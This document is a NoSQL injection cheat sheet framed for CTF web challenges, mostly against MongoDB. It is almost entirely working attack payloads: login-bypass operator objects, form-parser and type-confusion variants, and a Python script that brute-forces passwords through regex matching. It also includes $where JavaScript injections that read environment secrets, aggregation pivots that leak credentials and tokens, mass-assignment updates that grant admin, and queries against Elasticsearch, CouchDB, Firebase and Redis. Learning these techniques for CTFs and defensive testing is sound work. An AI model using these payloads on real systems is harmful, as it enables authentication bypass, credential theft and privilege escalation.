# NoSQL Injection

Mostly MongoDB in CTF web challenges. First identify whether the backend receives JSON, URL-encoded nested params, GraphQL variables, or a raw query object.

## Login Bypass

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$ne":null}}
{"username":{"$regex":"^admin$"},"password":{"$ne":null}}
{"$or":[{"username":"admin"},{"username":{"$ne":null}}],"password":{"$ne":null}}
{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":null}}
{"username":"admin","password":{"$gt":""}}
{"username":"admin","password":{"$exists":true}}
{"username":"admin","password":{"$not":{"$type":10}}}
{"username":{"$ne":"guest"},"password":{"$ne":"guest"}}
{"username":{"$regex":"admin","$options":"i"},"password":{"$ne":""}}
```

Form parser version:

```text
username[$ne]=x&password[$ne]=x
username=admin&password[$ne]=x
username[$regex]=^admin$&password[$ne]=x
username[$in][]=admin&username[$in][]=root&password[$ne]=x
$or[0][username]=admin&$or[1][username][$ne]=x&password[$ne]=x
username=admin&password[$gt]=
username=admin&password[$exists]=true
username[$regex]=admin&username[$options]=i&password[$ne]=x
```

Array/object type confusion:

```json
{"username":["admin"],"password":["x"]}
{"username":{"toString":"admin"},"password":{"$ne":null}}
{"username":true,"password":true}
{"username":0,"password":0}
{"username":null,"password":null}
```

## Mongo Operators

```json
{"$ne":null}
{"$gt":""}
{"$gte":""}
{"$lt":"~"}
{"$regex":"^a"}
{"$exists":true}
{"$in":["admin"]}
{"$nin":[""]}
{"$not":{"$regex":"^$"}}
{"$type":"string"}
{"$expr":{"$eq":[1,1]}}
{"$all":["admin"]}
{"$elemMatch":{"$ne":null}}
{"$size":1}
{"$mod":[1,0]}
```

Top-level logic:

```json
{"$or":[{"role":"admin"},{"username":"admin"}]}
{"$and":[{"username":"admin"},{"password":{"$ne":null}}]}
{"$nor":[{"disabled":true}]}
{"$expr":{"$eq":["$role","admin"]}}
{"$jsonSchema":{"required":["password"]}}
```

## Parser / Content-Type Checks

```bash
curl http://HOST/login -H 'Content-Type: application/json' -d '{"username":{"$ne":null},"password":{"$ne":null}}'
curl http://HOST/login -H 'Content-Type: application/x-www-form-urlencoded' -d 'username[$ne]=x&password[$ne]=x'
curl http://HOST/login -H 'Content-Type: application/json' -d '{"username":"admin","password":["x"]}'
curl http://HOST/login -H 'Content-Type: application/json' -d '{"username":"admin","password":true}'
curl http://HOST/login -H 'Content-Type: text/plain' --data '{"username":{"$ne":null},"password":{"$ne":null}}'
curl http://HOST/login -G --data-urlencode 'username[$ne]=x' --data-urlencode 'password[$ne]=x'
```

Duplicate source parsing:

```text
GET /login?username=admin
POST username[$ne]=x&password[$ne]=x
GET /login?username=guest&username[$ne]=x
POST JSON username string + query username[$ne]
```

Common Express parser shapes:

```text
extended qs parser: username[$ne]=x -> {"username":{"$ne":"x"}}
simple parser: username[$ne]=x -> {"username[$ne]":"x"}
JSON body parser: send object directly
GraphQL: put operators inside variables object
```

Operator-name filter bypass ideas:

```json
{"username":{"\u0024ne":null},"password":{"\u0024ne":null}}
{"username":{"$regex":"^adm.*"},"password":{"$ne":null}}
```

```text
If `$` is stripped only at top level, nest it: user[name][$ne]=x
If dots are blocked, try bracket notation in form body.
If objects are blocked, try arrays/booleans/null for type confusion.
```

## Regex Extract

```python
import requests
import string
import re

url = "http://TARGET/login"
known = ""
chars = string.ascii_letters + string.digits + "_{}-!@#$%^&*().,:;[]"

while not known.endswith("}"):
    for c in chars:
        prefix = re.escape(known + c)
        r = requests.post(url, json={
            "username": "admin",
            "password": {"$regex": "^" + prefix}
        })
        if "Welcome" in r.text:
            known += c
            print(known)
            break
```

Length / prefix probes:

```json
{"password":{"$regex":"^.{32}$"}}
{"password":{"$regex":"^CBC\\{"}}
{"password":{"$not":{"$regex":"^wrong"}}}
{"token":{"$regex":"^[0-9a-f]{64}$"}}
{"apiKey":{"$regex":"^.{20,80}$"}}
```

Safer regex character set:

```python
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-.@:"
```

Regex escaping matters:

```python
prefix = re.escape(known + c)
payload = {"password": {"$regex": "^" + prefix}}
```

Binary search on length:

```json
{"password":{"$regex":"^.{0,31}$"}}
{"password":{"$regex":"^.{32,64}$"}}
```

## JavaScript `$where`

Works only if server-side JavaScript is enabled and user input reaches `$where`.

```json
{"$where":"return true"}
{"$where":"this.username=='admin' && this.password.length > 10"}
{"$where":"this.password && this.password.startsWith('CBC{')"}
```

Time-ish probe:

```json
{"$where":"if (this.username=='admin') { var t=Date.now(); while(Date.now()-t<2000){}; } return true"}
```

If only a JavaScript expression/body is concatenated:

```text
'; return true; //
'; return this.password.startsWith('CBC{'); //
'; var t=Date.now(); while(Date.now()-t<2000){}; return true; //
```

Blind `$where` extraction:

```json
{"$where":"return this.username=='admin' && this.password[0]=='C'"}
{"$where":"return this.token && this.token.charCodeAt(0)>70"}
{"$where":"sleep(2000) || true"}
```

Older MongoDB / bad wrappers sometimes expose `db` or server JS helpers:

```json
{"$where":"return Object.keys(this).join(',').includes('password')"}
{"$where":"return this.constructor.constructor('return process')().env.FLAG"}
```

## Aggregation Injection

```json
{
  "query": [
    {"$match": {"title": null}},
    {"$unionWith": {
      "coll": "users",
      "pipeline": [
        {"$match": {"username": "admin", "password": {"$regex": "^a"}}}
      ]
    }}
  ]
}
```

Other aggregation pivots:

```json
[
  {"$lookup":{"from":"users","localField":"x","foreignField":"x","as":"leak"}},
  {"$project":{"leak.password":1,"leak.token":1}}
]
```

```json
[
  {"$unionWith":{"coll":"users"}},
  {"$match":{"password":{"$regex":"^CBC\\{"}}},
  {"$project":{"username":1,"password":1,"token":1}}
]
```

If `$function` is allowed:

```json
[
  {"$addFields":{"pwn":{"$function":{"body":"function(){return process.version}","args":[],"lang":"js"}}}}
]
```

Leak collection names when an aggregation endpoint accepts raw pipeline:

```json
[
  {"$listSessions":{}}
]
```

Practical `$lookup` when you know likely collection names:

```json
[
  {"$lookup":{"from":"users","pipeline":[{"$match":{}}],"as":"u"}},
  {"$project":{"u.username":1,"u.password":1,"u.token":1}}
]
```

Try likely collection names:

```text
users
user
accounts
admins
sessions
tokens
flags
flag
secrets
```

## Update / Mass Assignment Injection

If user input reaches `updateOne`, `findOneAndUpdate`, or profile update bodies:

```json
{"$set":{"role":"admin"}}
{"$set":{"isAdmin":true}}
{"$unset":{"disabled":1}}
{"$rename":{"password":"old_password"}}
{"$inc":{"balance":999999}}
```

Form parser:

```text
$set[role]=admin
$set[isAdmin]=true
$unset[disabled]=1
profile[$set][role]=admin
```

Mongoose gotcha:

```text
runValidators often does not protect unexpected update operators.
strict schema may drop unknown normal fields but still allow some operator-shaped input if passed raw.
```

## Projection / Sort / Populate

Useful when filter injection is blocked but projection/sort are user-controlled.

```json
{"projection":{"password":1,"token":1,"_id":0}}
{"fields":{"password":1,"token":1}}
{"sort":{"isAdmin":-1}}
{"limit":1000}
{"skip":0}
```

Mongoose-style:

```json
{"populate":"user"}
{"select":"+password +token +secret"}
{"projection":{"__v":0}}
{"lean":true}
```

Mongoose query option tricks:

```json
{"where":{"role":"admin"}}
{"conditions":{"password":{"$ne":null}}}
{"options":{"limit":1000}}
{"_fields":{"password":1,"token":1}}
```

ObjectId confusion:

```text
id[$ne]=x
_id[$ne]=x
_id[$in][]=000000000000000000000000&_id[$in][]=TARGET_ID
```

## Other NoSQL Targets

Elasticsearch query injection:

```json
{"query":{"match_all":{}}}
{"query":{"bool":{"should":[{"wildcard":{"flag":"CBC*"}},{"match_all":{}}]}}}
{"size":1000,"_source":["username","password","token","flag"]}
{"query":{"query_string":{"query":"* OR flag:CBC*"}}}
{"query":{"regexp":{"flag":"CBC\\{.*"}}}
```

CouchDB selector:

```json
{"selector":{"_id":{"$gt":null}}}
{"selector":{"flag":{"$regex":"^CBC"}}}
{"selector":{"$or":[{"role":"admin"},{"password":{"$gt":null}}]},"fields":["username","password","token","flag"]}
```

Firebase / Firestore rules mistakes:

```text
/users.json?orderBy="$key"&startAt="" 
/users/admin.json
/flags.json
```

```json
{"structuredQuery":{"from":[{"collectionId":"users"}],"where":{"fieldFilter":{"field":{"fieldPath":"role"},"op":"EQUAL","value":{"stringValue":"admin"}}}}}
```

Redis exposed through web wrapper:

```text
cmd=GET flag
cmd=KEYS *
cmd=HGETALL user:admin
cmd=CONFIG GET dir
```

## Parser Check

```bash
curl http://HOST/login -H 'Content-Type: application/json' -d '{"username":{"$ne":null},"password":{"$ne":null}}'
curl http://HOST/login -H 'Content-Type: application/x-www-form-urlencoded' -d 'username[$ne]=x&password[$ne]=x'
```
